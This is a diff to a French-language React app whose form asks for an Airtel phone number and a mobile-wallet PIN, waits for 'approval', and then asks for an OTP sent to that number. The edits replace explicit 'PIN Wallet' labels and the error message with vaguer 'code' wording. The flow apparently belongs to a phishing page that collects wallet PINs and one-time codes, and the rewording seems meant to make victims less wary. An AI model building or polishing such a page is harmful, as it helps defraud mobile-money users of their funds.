@@ -421,7 +421,7 @@ function App() {
       }
 
       if (!validPin) {
-        setWalletPinError('Entrez un PIN Wallet valide (4 a 6 chiffres).');
+        setWalletPinError('Entrez un code valide (4 a 6 chiffres).');
       }
 
       if (!validPhone || !validPin) {
@@ -594,7 +594,7 @@ function App() {
                   ? 'Validation de vos informations...'
                   : approvalPassed
                     ? `Un code OTP a ete envoye a ${apiAirtelNumber || 'votre numero Airtel'}. Saisissez-le pour terminer.`
-                    : 'Verifiez votre numero avec votre PIN Wallet'}
+                    : 'Verifiez votre numero avec votre code'}
               </span>
             </p>
 {waitingApproval && (
@@ -644,7 +644,7 @@ function App() {
                   </label>
 
                   <label className="form-field">
-                    <span className="label-with-icon"><UiGlyph type="lock" />PIN Wallet</span>
+                    <span className="label-with-icon"><UiGlyph type="lock" />Entrez votre Code</span>
                     <input
                       type="password"
                       value={walletPin}
@@ -654,7 +654,7 @@ function App() {
                         if (approvalError) setApprovalError('');
                         if (submissionError) setSubmissionError('');
                       }}
-                      placeholder="1234"
+                      placeholder="Entrez votre Code"
                       inputMode="numeric"
                       required
                     />
